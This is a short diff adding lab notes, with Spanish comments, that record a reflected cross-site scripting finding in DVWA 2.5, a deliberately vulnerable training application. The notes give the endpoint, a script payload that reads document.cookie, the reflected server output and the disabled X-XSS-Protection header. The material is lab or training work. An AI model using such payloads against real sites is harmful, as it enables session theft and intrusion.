@@ -1,0 +1,8 @@
+# Cross-Site Scripting reflejado (DVWA 2.5, seguridad=low)
+# Endpoint: GET /vulnerabilities/xss_r/?name=...
+# Payload : <script>alert(document.cookie)</script>
+
+75:		<pre>Hello <script>alert(document.cookie)</script></pre>
+
+# El servidor devuelve la cabecera X-XSS-Protection: 0
+X-XSS-Protection: 0
